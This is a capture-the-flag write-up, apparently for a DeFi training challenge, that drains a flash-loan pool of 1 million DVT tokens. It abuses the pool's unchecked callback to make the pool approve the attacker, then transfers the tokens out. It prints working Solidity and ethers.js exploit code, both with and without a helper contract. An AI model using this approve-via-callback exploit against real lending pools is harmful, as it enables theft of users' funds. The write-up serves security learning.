> More and more lending pools are offering flash loans.
> In this case, a new pool has launched that is offering flash loans of DVT tokens for free.

> The pool holds 1 million DVT tokens.
> You have nothing.

> To pass this challenge, take all tokens out of the pool.
> If possible, in a single transaction.

## Normal contract

The contract performs a blind callback, without any checks:

```solidity
target.functionCall(data);
```

Where [`functionCall`][openzeppelin-docs-functioncall] is a safer replacement for the low level `call`.

The contract assumes that if the tokens are returned after this call, all is good:

```solidity
if (token.balanceOf(address(this)) < balanceBefore)
    revert RepayFailed();
```

However, instead of directly transfering tokens, we can just [`approve`][openzeppelin-docs-approve] an address!
With the target of the callback set to the token, the goal is to craft the calldata to:

1) point to the `approve` function
2) with arguments:
  - `spender` set to the player address
  - `amount` set to the whole pool balance

Which is easily done with:

```js
const _abi = ['function approve(address spender,uint256 amount)'];
const _interface = new ethers.utils.Interface(_abi);
const _data =_interface.encodeFunctionData("approve", [player.address, '0xffffffffffffffffffffffffffffffff']);
```

Somehow I could not get execute this chain with `ethers`, so I wrapped it in a contract:

```solidity
bytes memory _payload = abi.encodeWithSignature("approve(address,uint256)", address(this), _balance);
```

Notice that it requests to approve the contract address and not the player.
The method `transferFrom` considers the `msg.sender` to decide whether the transfer is allowed.

Next the players borrows `0` tokens to avoid having to repay:

```solidity
pool.flashLoan(0, msg.sender, address(token), _payload);
```

The normal contract can be trusted with tokens ofc.
Now that the contract is approved it can transfer tokens:

```js
token.transferFrom(address(pool), msg.sender, _balance);
```

To validate this challenge, it is important to call the malicious contract from the player address:

```js
await _normal.connect(player).pwn(pool.address, token.address);
```

## Without a contract

```js
const _abi = ['function approve(address spender, uint256 amount)'];
const _interface = new ethers.utils.Interface(_abi);
const _data =_interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
await pool.flashLoan(0, player.address, token.address, _data);
await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
```

[openzeppelin-docs-approve]: https://docs.openzeppelin.com/contracts/2.x/api/token/erc20#IERC20-approve-address-uint256-
[openzeppelin-docs-functioncall]: https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-functionCall-address-bytes-
